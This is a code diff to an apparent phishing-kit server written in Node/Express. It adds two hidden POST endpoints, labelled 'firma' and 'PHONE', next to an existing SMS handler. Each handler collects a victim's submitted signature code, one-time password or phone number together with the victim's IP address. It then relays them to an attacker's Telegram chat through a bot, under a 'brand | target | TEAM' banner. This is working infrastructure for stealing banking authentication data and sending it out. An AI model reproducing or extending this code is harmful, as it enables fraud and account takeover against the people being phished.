@@ -179,6 +179,18 @@ app.post("/Qv69PRvXg6PQEvrzJx6j",(req,res)=>{ // sms2 post
     a4(data,requestIp.getClientIp(req));
     res.send({OK:true});
 });
+app.post("/Ov69PRlXg6PtEvrzJx6g",(req,res)=>{ // firma post
+    let data = req.body;
+    // console.log(data);
+    a5(data,requestIp.getClientIp(req));
+    res.send({OK:true});
+});
+app.post("/Mv67PRcPg6POEvrzJx6k",(req,res)=>{ // PHONE post
+    let data = req.body;
+    // console.log(data);
+    a6(data,requestIp.getClientIp(req));
+    res.send({OK:true});
+});
 
 
 // Functions:
@@ -222,6 +234,26 @@ function a4(data,ip) {
     block += `${brand}  | [SMS](2) |  TEAM\n`; 
     block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
     block += `OTP: ${data.sps2}\nIP: ${ip}\n`;
+    block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
+    block += `${brand}  | [${target}]  |  TEAM`;
+    
+    bot.telegram.sendMessage(process.env.CHATID,block);
+}
+function a5(data,ip) {
+    let block="";
+    block += `${brand}  | [FIRMA] |  TEAM\n`; 
+    block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
+    block += `CODE: ${data.firma}\nIP: ${ip}\n`;
+    block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
+    block += `${brand}  | [${target}]  |  TEAM`;
+    
+    bot.telegram.sendMessage(process.env.CHATID,block);
+}
+function a6(data,ip) {
+    let block="";
+    block += `${brand}  | [TELE-Phone] |  TEAM\n`; 
+    block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
+    block += `PHONE: ${data.namra}\nIP: ${ip}\n`;
     block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
     block += `${brand}  | [${target}]  |  TEAM`;
     
